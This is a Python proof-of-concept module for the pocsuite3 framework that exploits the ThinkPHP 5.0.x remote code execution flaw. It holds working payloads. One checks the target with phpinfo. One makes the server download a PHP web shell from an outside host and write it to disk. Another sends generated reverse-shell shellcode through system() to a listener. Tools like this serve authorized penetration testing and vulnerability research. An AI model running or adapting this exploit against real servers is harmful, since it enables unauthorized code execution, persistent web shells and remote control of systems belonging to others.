"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list


class DemoPOC(POCBase):
    vulID = '97767'  # ssvid
    version = '1.0'
    author = ['chenghs']
    vulDate = '2019-1-11'
    createDate = '2019-1-11'
    updateDate = '2019-1-11'
    references = ['https://www.seebug.org/vuldb/ssvid-97765']
    name = 'Thinkphp 5.0.x 远程代码执行漏洞'
    appPowerLink = 'http://www.thinkphp.cn/'
    appName = 'thinkphp'
    appVersion = 'thinkphp5.0.23'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Thinphp团队在实现框架中的核心类Requests的method方法实现了表单请求类型伪装，默认为$_POST[‘_method’]变量，却没有对$_POST[‘_method’]属性进行严格校验，可以通过变量覆盖掉Requets类的属性并结合框架特性实现对任意函数的调用达到任意代码执行的效果。'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _check(self, url):
        flag = 'PHP Extension Build'
        data = "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"

        payloads = [
            r"/index.php?s=captcha"
        ]
        for payload in payloads:
            vul_url = url + payload
            headers = {
                "Content-Type": "application/x-www-form-urlencoded"
            }
            r = requests.post(vul_url, data=data, headers=headers)

            if flag in r.text:
                return payload, data
        return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['Postdata'] = p[1]

        return self.parse_output(result)

    def _attack(self):
        result = {}
        filename = random_str(6) + ".php"
        shell_addr = "https://pocsuite.org/include_files/php_attack.txt"
        payload = "/index.php?s=captcha&Test=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))".format(
            filename=filename,
            url=shell_addr)
        vul_url = self.url + payload
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = "_method=__construct&filter=assert&method=get&server[REQUEST_METHOD]=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))".format(
            filename=filename,
            url=shell_addr
        )
        requests.post(vul_url, data=data, headers=headers)
        r = requests.post(self.url + "/" + filename, data="c=phpinfo();", headers=headers)
        if r.status_code == 200 and "PHP Extension Build" in r.text:
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = self.url + "/" + filename
            result['ShellInfo']['Content'] = shell_addr
        return self.parse_output(result)

    def _shell(self):
        vulurl = self.url + "/index.php?s=captcha"
        # 生成写入文件的shellcode
        _list = generate_shellcode_list(listener_ip=get_listener_ip(), listener_port=get_listener_port(),
                                        os_target=OS.LINUX,
                                        os_target_arch=OS_ARCH.X86)
        for i in _list:
            data = {
                '_method': '__construct',
                'filter[]': 'system',
                'method': 'get',
                'server[REQUEST_METHOD]': i
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded"
            }
            requests.post(vulurl, data=data, headers=headers)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
